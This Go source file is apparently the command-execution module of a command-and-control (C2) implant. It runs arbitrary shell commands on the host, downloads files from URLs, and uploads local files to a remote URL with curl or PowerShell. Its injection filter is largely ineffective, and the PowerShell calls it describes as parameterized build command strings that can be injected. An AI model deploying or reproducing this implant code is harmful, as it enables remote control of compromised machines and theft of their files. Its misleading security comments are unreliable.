package commands

import (
	"context"
	"fmt"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

// Executor handles command execution
type Executor struct {
	timeout time.Duration
}

// NewExecutor creates a new command executor
func NewExecutor(timeout time.Duration) *Executor {
	return &Executor{timeout: timeout}
}

// Execute runs a system command with basic sanitization
// Note: For C2 frameworks, command execution is intentional but we validate inputs
// to prevent unintended command injection attacks
func (e *Executor) Execute(command string) (string, error) {
	if command == "" {
		return "", fmt.Errorf("empty command")
	}
	
	// Basic validation: check for dangerous patterns
	if containsDangerousPatterns(command) {
		return "", fmt.Errorf("command contains potentially dangerous patterns")
	}
	
	ctx, cancel := context.WithTimeout(context.Background(), e.timeout)
	defer cancel()
	
	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "windows":
		// Use shell execution but with limited validation
		cmd = exec.CommandContext(ctx, "cmd.exe", "/c", command)
	case "linux", "darwin":
		// Use shell execution but with limited validation
		cmd = exec.CommandContext(ctx, "/bin/sh", "-c", command)
	default:
		// Try to parse command into parts for safer execution
		parts := strings.Fields(command)
		if len(parts) == 0 {
			return "", fmt.Errorf("invalid command")
		}
		if len(parts) == 1 {
			cmd = exec.CommandContext(ctx, parts[0])
		} else {
			cmd = exec.CommandContext(ctx, parts[0], parts[1:]...)
		}
	}
	
	output, err := cmd.CombinedOutput()
	return string(output), err
}

// containsDangerousPatterns checks for patterns that could indicate command injection
// This is a basic check - in a real C2, operators intentionally execute commands
// but we want to prevent accidental injection from malformed inputs
func containsDangerousPatterns(command string) bool {
	// Check for patterns that suggest command chaining or injection
	dangerous := []string{
		"&&", "||", ";", "|", "`", "$(", "${", "<(",
		">>", "<<", ">", "<", "|&",
	}
	
	// Allow if command is intentionally a shell command (like "ls -la")
	// but block obvious injection attempts
	for _, pattern := range dangerous {
		// Allow if it's part of a legitimate command structure
		// but block if it appears suspiciously
		if strings.Contains(command, pattern) {
			// Additional check: if pattern appears after what looks like
			// command completion, it might be injection
			if strings.Count(command, pattern) > 2 {
				return true
			}
		}
	}
	
	return false
}

// ExecuteShell starts an interactive shell
func (e *Executor) ExecuteShell() error {
	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "windows":
		cmd = exec.Command("cmd.exe")
	case "linux", "darwin":
		cmd = exec.Command("/bin/sh")
	default:
		return nil
	}
	
	cmd.Stdin = nil
	cmd.Stdout = nil
	cmd.Stderr = nil
	
	return cmd.Run()
}

// DownloadFile downloads a file from URL
func (e *Executor) DownloadFile(url, destination string) error {
	// Validate inputs
	if url == "" || destination == "" {
		return fmt.Errorf("url and destination cannot be empty")
	}
	
	// Sanitize file paths to prevent command injection
	destination = sanitizePath(destination)
	
	var cmd *exec.Cmd
	ctx, cancel := context.WithTimeout(context.Background(), e.timeout)
	defer cancel()
	
	switch runtime.GOOS {
	case "windows":
		// Use parameterized command to prevent injection
		cmd = exec.CommandContext(ctx, "powershell", "-Command", 
			fmt.Sprintf("Invoke-WebRequest -Uri '%s' -OutFile '%s'", url, destination))
	case "linux", "darwin":
		// Use separate arguments for safer execution
		cmd = exec.CommandContext(ctx, "curl", "-o", destination, url)
	default:
		return fmt.Errorf("unsupported OS: %s", runtime.GOOS)
	}
	
	return cmd.Run()
}

// UploadFile uploads a file to URL
func (e *Executor) UploadFile(source, url string) error {
	// Validate inputs
	if source == "" || url == "" {
		return fmt.Errorf("source and url cannot be empty")
	}
	
	// Sanitize file paths to prevent command injection
	source = sanitizePath(source)
	
	var cmd *exec.Cmd
	ctx, cancel := context.WithTimeout(context.Background(), e.timeout)
	defer cancel()
	
	switch runtime.GOOS {
	case "windows":
		// Use parameterized command to prevent injection
		cmd = exec.CommandContext(ctx, "powershell", "-Command",
			fmt.Sprintf("Invoke-WebRequest -Uri '%s' -Method POST -InFile '%s'", url, source))
	case "linux", "darwin":
		// Use separate arguments - sanitize path before adding @ prefix
		cmd = exec.CommandContext(ctx, "curl", "-X", "POST", "-F", "file=@"+source, url)
	default:
		return fmt.Errorf("unsupported OS: %s", runtime.GOOS)
	}
	
	return cmd.Run()
}

// sanitizePath removes dangerous characters from file paths
func sanitizePath(path string) string {
	// Remove command injection characters
	dangerous := []string{"&", "|", ";", "`", "$(", "${", "<(", ">", "<", ">>", "<<"}
	result := path
	for _, char := range dangerous {
		result = strings.ReplaceAll(result, char, "")
	}
	
	// Remove null bytes
	result = strings.ReplaceAll(result, "\x00", "")
	
	return result
}

